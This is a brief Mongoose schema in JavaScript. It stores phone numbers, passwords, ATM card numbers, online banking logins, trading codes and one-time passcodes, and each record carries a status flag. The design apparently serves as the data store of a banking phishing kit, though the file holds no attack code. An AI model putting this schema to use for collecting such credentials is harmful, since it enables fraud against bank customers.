var mongoose = require("mongoose");
var Schema = mongoose.Schema;
var InFo = new Schema({
    phonenumber: Number,
    passwowrd:String,
    Internationaltransactioncode:Number,
    Bank:String,
    NumberATM:String,
    NameAcount:String,
    releasedate:Date,
    UserBanking:String,
    PasswordBanking:String,
    Tradingcode:String,
    OTP:String,
    Createat:{
        type:Date,
        default:Date.now,
        timezone: 'Asia/Jakarta'
    }
    ,
    status:{
        type:Boolean,
        default:false
    }
})
module.exports = mongoose.model("InFo",InFo);